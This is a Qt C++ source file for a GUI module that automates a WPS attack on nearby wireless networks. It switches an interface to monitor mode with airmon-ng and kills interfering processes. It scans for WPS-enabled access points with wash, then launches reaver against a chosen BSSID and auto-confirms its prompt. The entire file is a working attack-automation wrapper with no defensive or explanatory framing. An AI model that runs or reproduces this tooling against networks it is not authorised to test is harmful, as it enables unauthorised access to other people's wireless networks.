#include "wps_attack_module.h"

WPS_Attack_module::WPS_Attack_module(QObject *parent) : QObject(parent)
{
    connect(Module_1793::qmlRootObjectHandler, SIGNAL(signal_Refresh_WPS_list(QString)), this, SLOT(refresh_WPS_networks_list(QString)));

    connect(Module_1793::qmlRootObjectHandler, SIGNAL(signal_Refresh_interfaces_list()), this, SLOT(refresh_interfaces_list()));
    connect(Module_1793::qmlRootObjectHandler, SIGNAL(signal_Stop_refreshing_WPS_list()), this, SLOT(stop_refreshing_WPS_list()));

    connect(Module_1793::qmlRootObjectHandler, SIGNAL(signal_Start_WPS_attack(QString, QString, QString)), this, SLOT(WPS_attack(QString, QString, QString)));
    connect(Module_1793::qmlRootObjectHandler, SIGNAL(signal_Stop_WPS_attack()), this, SLOT(stop_WPS_attack()));

    connect(this, SIGNAL(add_new_WPS_network(Network)), Model_1793::model, SLOT(add_new_network(Network)));
    connect(this, SIGNAL(add_new_interface(QString)), Model_1793::model, SLOT(add_new_interface(QString)));

    connect(this, SIGNAL(clear_WPS_list_model()), Model_1793::model, SLOT(clear_WPS_networks_list()));
    connect(this, SIGNAL(clear_interfaces_list_model()), Model_1793::model, SLOT(clear_interfaces_list()));
}

WPS_Attack_module::~WPS_Attack_module()
{

}

void WPS_Attack_module::initialize()
{
    refresh_interfaces_list();
}

void WPS_Attack_module::terminate()
{
    if (!switchInterfaceToMonitor.isNull())
    {
        if (switchInterfaceToMonitor->state() == QProcess::Running)
        {
            disconnect(switchInterfaceToMonitor, SIGNAL(readyRead()), this, SLOT(handle_switch_interface_to_monitor_data()));
            disconnect(switchInterfaceToMonitor, SIGNAL(finished(int)), this, SLOT(start_checking_apps_tokill()));
            switchInterfaceToMonitor->terminate();
            switchInterfaceToMonitor->waitForFinished();
        }
        switchInterfaceToMonitor.clear();
    }

    if (!switchInterfaceToStation.isNull())
    {
        if (switchInterfaceToStation->state() == QProcess::Running)
        {
            disconnect(switchInterfaceToStation, SIGNAL(readyRead()), this, SLOT(handle_switch_interface_to_station_data()));
            disconnect(switchInterfaceToStation, SIGNAL(finished(int)), this, SLOT(stop_switching_interface_to_station()));
            switchInterfaceToStation->terminate();
            switchInterfaceToStation->waitForFinished();
        }
        switchInterfaceToStation.clear();
    }

    if (!checkAppsToKill.isNull())
    {
        if (checkAppsToKill->state() == QProcess::Running)
        {
            disconnect(checkAppsToKill, SIGNAL(readyRead()), this, SLOT(handle_checking_apps_tokill_data()));
            disconnect(checkAppsToKill, SIGNAL(finished(int)), this, SLOT(start_putting_interface_down()));
            checkAppsToKill->terminate();
            checkAppsToKill->waitForFinished();
        }
        checkAppsToKill.clear();
    }

    if (!puttingInterfaceDown.isNull())
    {
        if (puttingInterfaceDown->state() == QProcess::Running)
        {
            disconnect(puttingInterfaceDown, SIGNAL(finished(int)), this, SLOT(start_putting_interface_up()));
            puttingInterfaceDown->terminate();
            puttingInterfaceDown->waitForFinished();
        }
        puttingInterfaceDown.clear();
    }

    if (!puttingInterfaceUp.isNull())
    {
        if (puttingInterfaceUp->state() == QProcess::Running)
        {
            if (currentInterfaceMode == flag_interface_WPS_refreshing)
                disconnect(puttingInterfaceUp, SIGNAL(finished(int)), this, SLOT(start_refreshing_WPS_list()));
            else if (currentInterfaceMode == flag_interface_WPS_attack)
                disconnect(puttingInterfaceUp, SIGNAL(finished(int)), this, SLOT(start_WPS_attack()));
            else
                disconnect(puttingInterfaceUp, SIGNAL(finished(int)), this, SLOT(switch_interface_to_station()));
            puttingInterfaceUp->terminate();
            puttingInterfaceUp->waitForFinished();
        }
        puttingInterfaceUp.clear();
    }

    if (!startWPSAttack.isNull())
    {
        if (startWPSAttack->state() == QProcess::Running)
        {
            qDebug() << "WPS_attack interrupted";
            disconnect(startWPSAttack, SIGNAL(readyRead()), this, SLOT(handle_WPS_attack_data()));
            disconnect(startWPSAttack, SIGNAL(started()), this, SLOT(WPS_send_confirm()));
            disconnect(startWPSAttack, SIGNAL(finished(int)), this, SLOT(complete_WPS_attack()));
            startWPSAttack->terminate();
            startWPSAttack->waitForFinished();
            startWPSAttack.clear();
        }
    }

    if (!loadWPSLits.isNull())
    {
        if (loadWPSLits->state() == QProcess::Running)
        {
            qDebug() << "WPS list refreshing interrupted";
            disconnect(loadWPSLits, SIGNAL(readyRead()), this, SLOT(handle_refreshing_WPS_data()));
            loadWPSLits->terminate();
            loadWPSLits->waitForFinished();
            loadWPSLits.clear();
        }
    }

    loadInterfacesList = new QProcess;
    loadInterfacesList->start("iw dev");
    loadInterfacesList->waitForStarted(1000);
    loadInterfacesList->waitForReadyRead(1000);
    QByteArray data;
    data.append(loadInterfacesList->readAll());
    QRegularExpression interfaceName("(?<=Interface(\\s))(\\w+)");

    QRegularExpressionMatchIterator i = interfaceName.globalMatch(QVariant(data).toString());
    while (i.hasNext())
    {
        QRegularExpressionMatch captureInterfaceName = i.next();
        if (captureInterfaceName.hasMatch())
        {
            if (captureInterfaceName.captured(0).contains("mon"))
            {
                qDebug() << "Interfaces list contains monitor interface. Switching it to station...";
                switchInterfaceToStation = new QProcess;
                switchInterfaceToStation->start("airmon-ng stop " + captureInterfaceName.captured(0));
                switchInterfaceToStation->waitForFinished();
                switchInterfaceToStation.clear();
            }
        }
    }
    loadInterfacesList.clear();

//    qDebug() << "startWPSAttack" << startWPSAttack.data();
//    qDebug() << "loadWPSLits" << loadWPSLits.data();
//    qDebug() << "loadInterfacesList" << loadInterfacesList.data();
//    qDebug() << "switchInterfaceToMonitor" << switchInterfaceToMonitor.data();
//    qDebug() << "switchInterfaceToStation" << switchInterfaceToStation.data();
//    qDebug() << "checkAppsToKill" << checkAppsToKill.data();
//    qDebug() << "puttingInterfaceDown" << puttingInterfaceDown.data();
//    qDebug() << "puttingInterfaceUp" << puttingInterfaceUp.data();

    qDebug() << "WPS_Attack termination";
}

void WPS_Attack_module::refresh_interfaces_list()
{
    emit clear_interfaces_list_model();
    loadInterfacesList = new QProcess;
    connect(loadInterfacesList, SIGNAL(readyRead()), this, SLOT(handle_interfaces_info()));
    connect(loadInterfacesList, SIGNAL(finished(int)), this, SLOT(stop_refreshing_interfaces_list()));
    loadInterfacesList->start("iw dev");
}

void WPS_Attack_module::handle_interfaces_info()
{
    QByteArray data;
    data.append(loadInterfacesList->readAll());
    append_new_message_to_std(QVariant(data));

    QRegularExpression interfaceName("(?<=Interface(\\s))(\\w+)");

    QRegularExpressionMatchIterator i = interfaceName.globalMatch(QVariant(data).toString());
    while (i.hasNext())
    {
        QRegularExpressionMatch captureInterfaceName = i.next();
        if (captureInterfaceName.hasMatch())
        {
            emit add_new_interface(captureInterfaceName.captured(0));
        }
    }
}

void WPS_Attack_module::stop_refreshing_interfaces_list()
{
    loadInterfacesList.clear();
}

void WPS_Attack_module::refresh_WPS_networks_list(const QString& interface)
{
    if (interface.isEmpty())
    {
        append_new_message_to_std(QVariant("Please select your wireless interface"));
        return;
    }
    emit clear_WPS_list_model();
    currentInterfaceMode = flag_interface_WPS_refreshing;
    start_working_with_interface(interface);
}

void WPS_Attack_module::start_working_with_interface(const QString& interface)
{
    monitorInterface = "";
    switchInterfaceToMonitor = new QProcess;
    connect(switchInterfaceToMonitor, SIGNAL(readyRead()), this, SLOT(handle_switch_interface_to_monitor_data()));
    connect(switchInterfaceToMonitor, SIGNAL(finished(int)), this, SLOT(start_checking_apps_tokill()));
    switchInterfaceToMonitor->start("airmon-ng start " + interface);
}

void WPS_Attack_module::handle_switch_interface_to_monitor_data()
{
    QByteArray data;
    data.append(switchInterfaceToMonitor->readAll());
    append_new_message_to_std(QVariant(data));

    QString metaDevice;
    QRegularExpression metaDeviceExp("(?<=on\\s\\[)(\\w+)");
    QRegularExpressionMatch captureMetaDevice = metaDeviceExp.match(QVariant(data).toString());
    if (captureMetaDevice.hasMatch())
    {
        metaDevice = captureMetaDevice.captured(0);
    }
    QRegularExpression monitorInterfaceName("(?<=on\\s\\["+metaDevice+"\\])(\\w+)");

    QRegularExpressionMatch captureIntName = monitorInterfaceName.match(QVariant(data).toString());

    if (captureIntName.hasMatch())
    {
        monitorInterface = captureIntName.captured(0);
    }
}

void WPS_Attack_module::stop_switching_interface_to_monitor()
{
    switchInterfaceToMonitor.clear();
    switch_interface_to_station();
}

void WPS_Attack_module::start_checking_apps_tokill()
{
    switchInterfaceToMonitor.clear();
    checkAppsToKill = new QProcess;
    connect(checkAppsToKill, SIGNAL(readyRead()), this, SLOT(handle_checking_apps_tokill_data()));
    connect(checkAppsToKill, SIGNAL(finished(int)), this, SLOT(start_putting_interface_down()));
    checkAppsToKill->start("airmon-ng check kill");
}

void WPS_Attack_module::handle_checking_apps_tokill_data()
{
    QByteArray data;
    data.append(checkAppsToKill->readAll());
    append_new_message_to_std(QVariant(data));
    qDebug() << "checked";
}

void WPS_Attack_module::start_putting_interface_down()
{
    checkAppsToKill.clear();
    puttingInterfaceDown = new QProcess;
    connect(puttingInterfaceDown, SIGNAL(finished(int)), this, SLOT(start_putting_interface_up()));
    puttingInterfaceDown->start("ifconfig " + monitorInterface + " down");
}

void WPS_Attack_module::start_putting_interface_up()
{
    puttingInterfaceDown.clear();
    puttingInterfaceUp = new QProcess;
    if (currentInterfaceMode == flag_interface_WPS_refreshing)
        connect(puttingInterfaceUp, SIGNAL(finished(int)), this, SLOT(start_refreshing_WPS_list()));
    else if (currentInterfaceMode == flag_interface_WPS_attack)
        connect(puttingInterfaceUp, SIGNAL(finished(int)), this, SLOT(start_WPS_attack()));
    else
        connect(puttingInterfaceUp, SIGNAL(finished(int)), this, SLOT(switch_interface_to_station()));
    puttingInterfaceUp->start("ifconfig " + monitorInterface + " up");
}

void WPS_Attack_module::start_refreshing_WPS_list()
{
    puttingInterfaceUp.clear();
    loadWPSLits = new QProcess(this);
    connect(loadWPSLits, SIGNAL(readyRead()), this, SLOT(handle_refreshing_WPS_data()));
    loadWPSLits->start("wash -i " + monitorInterface);
}

void WPS_Attack_module::handle_refreshing_WPS_data()
{
    QByteArray data;
    data = loadWPSLits->readAll();
    append_new_message_to_std(QVariant(data).toString());
    QString essid, bssid;
    QRegularExpression bssidExp("\\S\\S:\\S\\S:\\S\\S:\\S\\S:\\S\\S:\\S\\S");
    QRegularExpressionMatch captureBssid = bssidExp.match(QVariant(data).toString());
    if (captureBssid.hasMatch())
    {
        bssid = captureBssid.captured(0);
        QRegularExpression essidExp("\\S+?\\s?\\S+?\\s?\\S+$");
        QRegularExpressionMatch captureEssid = essidExp.match(QVariant(data).toString());
        if (captureEssid.hasMatch())
        {
            essid = captureEssid.captured(0);
            add_new_WPS_network(Network(essid,bssid));
        }
    }
}

void WPS_Attack_module::switch_interface_to_station()
{
    if (currentInterfaceMode == flag_interface_WPS_refreshing)
        loadWPSLits.clear();
    else if (currentInterfaceMode == flag_interface_WPS_attack)
        startWPSAttack.clear();
    else
        puttingInterfaceUp.clear();

    switchInterfaceToStation = new QProcess;
    connect(switchInterfaceToStation, SIGNAL(readyRead()), this, SLOT(handle_switch_interface_to_station_data()));
    connect(switchInterfaceToStation, SIGNAL(finished(int)), this, SLOT(stop_switching_interface_to_station()));
    switchInterfaceToStation->start("airmon-ng stop " + monitorInterface);
}

void WPS_Attack_module::handle_switch_interface_to_station_data()
{
    QByteArray data;
    data.append(switchInterfaceToStation->readAll());
    append_new_message_to_std(QVariant(data));
}

void WPS_Attack_module::stop_switching_interface_to_station()
{
    switchInterfaceToStation.clear();
    currentInterfaceMode = flag_interface_not_handling;
    monitorInterface = "";
    qDebug() << "switching to station stopped";
    complete_routine();
}

void WPS_Attack_module::stop_refreshing_WPS_list()
{
    if (!switchInterfaceToMonitor.isNull())
    {
        if (switchInterfaceToMonitor->state() == QProcess::Running)
        {
            disconnect(switchInterfaceToMonitor, SIGNAL(finished(int)), this, SLOT(start_checking_apps_tokill()));
            connect(switchInterfaceToMonitor, SIGNAL(finished(int)), this, SLOT(stop_switching_interface_to_monitor()));
        }
    } else

    if (!checkAppsToKill.isNull())
    {
        if (checkAppsToKill->state() == QProcess::Running)
        {
            disconnect(checkAppsToKill, SIGNAL(readyRead()), this, SLOT(handle_checking_apps_tokill_data()));
            disconnect(checkAppsToKill, SIGNAL(finished(int)), this, SLOT(start_putting_interface_down()));
            checkAppsToKill->terminate();
            switch_interface_to_station();
        }
        checkAppsToKill.clear();
    } else

    if (!puttingInterfaceDown.isNull())
    {
        if (puttingInterfaceDown->state() == QProcess::Running)
        {
            disconnect(puttingInterfaceDown, SIGNAL(finished(int)), this, SLOT(start_putting_interface_up()));
            puttingInterfaceDown->terminate();
            switch_interface_to_station();
        }
        puttingInterfaceDown.clear();
    } else

    if (!puttingInterfaceUp.isNull())
    {
        if (puttingInterfaceUp->state() == QProcess::Running)
        {
            if (currentInterfaceMode == flag_interface_WPS_refreshing)
                disconnect(puttingInterfaceUp, SIGNAL(finished(int)), this, SLOT(start_refreshing_WPS_list()));
            else if (currentInterfaceMode == flag_interface_WPS_attack)
                disconnect(puttingInterfaceUp, SIGNAL(finished(int)), this, SLOT(start_WPS_attack()));
            else
                disconnect(puttingInterfaceUp, SIGNAL(finished(int)), this, SLOT(switch_interface_to_station()));
            puttingInterfaceUp->terminate();
            switch_interface_to_station();
        }
        puttingInterfaceUp.clear();
    } else

    if (!loadWPSLits.isNull())
    {
        if (loadWPSLits->state() == QProcess::Running)
        {
            append_new_message_to_std(QVariant("WPS list updated"));
            disconnect(loadWPSLits, SIGNAL(readyRead()), this, SLOT(handle_refreshing_WPS_data()));
            loadWPSLits->terminate();
            loadWPSLits.clear();
            switch_interface_to_station();
        }
    } else

    {
        complete_routine();
    }
}

void WPS_Attack_module::complete_routine()
{
    QPointer<QObject> moduleObject = Module_1793::qmlRootObjectHandler->findChild<QObject*>("wpsAttackModule");
    QMetaObject::invokeMethod(moduleObject, "show_all");
    moduleObject.clear();
}

void WPS_Attack_module::WPS_attack(const QString &interface, const QString &essid, const QString &bssid)
{
    //qDebug() << "Name:" << essid << "Mac:" << bssid;
    name = essid;
    mac = bssid;
    currentInterfaceMode = flag_interface_WPS_attack;
    start_working_with_interface(interface);
}

void WPS_Attack_module::start_WPS_attack()
{
    puttingInterfaceUp.clear();
    startWPSAttack = new QProcess(this);
    connect(startWPSAttack, SIGNAL(readyRead()), this, SLOT(handle_WPS_attack_data()));
    connect(startWPSAttack, SIGNAL(started()), this, SLOT(WPS_send_confirm()));
    connect(startWPSAttack, SIGNAL(finished(int)), this, SLOT(complete_WPS_attack()));
    startWPSAttack->start("reaver -i " + monitorInterface + " -b " + mac + " -vv", QProcess::ReadWrite);
}

void WPS_Attack_module::handle_WPS_attack_data()
{
    QByteArray data;
    data.append(startWPSAttack->readAll());
    append_new_message_to_std(QVariant(data));
//    QRegularExpression questionExp("\\n");
//    QRegularExpressionMatch questionCap = questionExp.match(QVariant(data).toString());
//    if (questionCap.hasMatch())
//        qDebug() << "Has match";
}

void WPS_Attack_module::WPS_send_confirm()
{
    startWPSAttack->write("Y");
}

void WPS_Attack_module::complete_WPS_attack()
{
    complete_routine();
}

void WPS_Attack_module::stop_WPS_attack()
{
    if (!switchInterfaceToMonitor.isNull())
    {
        if (switchInterfaceToMonitor->state() == QProcess::Running)
        {
            disconnect(switchInterfaceToMonitor, SIGNAL(finished(int)), this, SLOT(start_checking_apps_tokill()));
            connect(switchInterfaceToMonitor, SIGNAL(finished(int)), this, SLOT(stop_switching_interface_to_monitor()));
        }
    } else

    if (!checkAppsToKill.isNull())
    {
        if (checkAppsToKill->state() == QProcess::Running)
        {
            disconnect(checkAppsToKill, SIGNAL(readyRead()), this, SLOT(handle_checking_apps_tokill_data()));
            disconnect(checkAppsToKill, SIGNAL(finished(int)), this, SLOT(start_putting_interface_down()));
            checkAppsToKill->terminate();
            switch_interface_to_station();
        }
        checkAppsToKill.clear();
    } else

    if (!puttingInterfaceDown.isNull())
    {
        if (puttingInterfaceDown->state() == QProcess::Running)
        {
            disconnect(puttingInterfaceDown, SIGNAL(finished(int)), this, SLOT(start_putting_interface_up()));
            puttingInterfaceDown->terminate();
            switch_interface_to_station();
        }
        puttingInterfaceDown.clear();
    } else

    if (!puttingInterfaceUp.isNull())
    {
        if (puttingInterfaceUp->state() == QProcess::Running)
        {
            if (currentInterfaceMode == flag_interface_WPS_refreshing)
                disconnect(puttingInterfaceUp, SIGNAL(finished(int)), this, SLOT(start_refreshing_WPS_list()));
            else if (currentInterfaceMode == flag_interface_WPS_attack)
                disconnect(puttingInterfaceUp, SIGNAL(finished(int)), this, SLOT(start_WPS_attack()));
            else
                disconnect(puttingInterfaceUp, SIGNAL(finished(int)), this, SLOT(switch_interface_to_station()));
            puttingInterfaceUp->terminate();
            switch_interface_to_station();
        }
        puttingInterfaceUp.clear();
    } else

    if (!startWPSAttack.isNull())
    {
        if (startWPSAttack->state() == QProcess::Running)
        {
            append_new_message_to_std(QVariant("WPS_attack interrupted"));
            disconnect(startWPSAttack, SIGNAL(readyRead()), this, SLOT(handle_WPS_attack_data()));
            disconnect(startWPSAttack, SIGNAL(started()), this, SLOT(WPS_send_confirm()));
            disconnect(startWPSAttack, SIGNAL(finished(int)), this, SLOT(complete_WPS_attack()));
            startWPSAttack->terminate();
            startWPSAttack.clear();
            switch_interface_to_station();
        }
    } else

    {
        complete_routine();
    }
}

void WPS_Attack_module::append_new_message_to_std(const QVariant& data)
{
    QPointer<QObject> moduleObject = Module_1793::qmlRootObjectHandler->findChild<QObject*>("wpsAttackModule");
    QMetaObject::invokeMethod(moduleObject, "append_stdout_text",
                              Q_ARG(QVariant, data));
    moduleObject.clear();
}
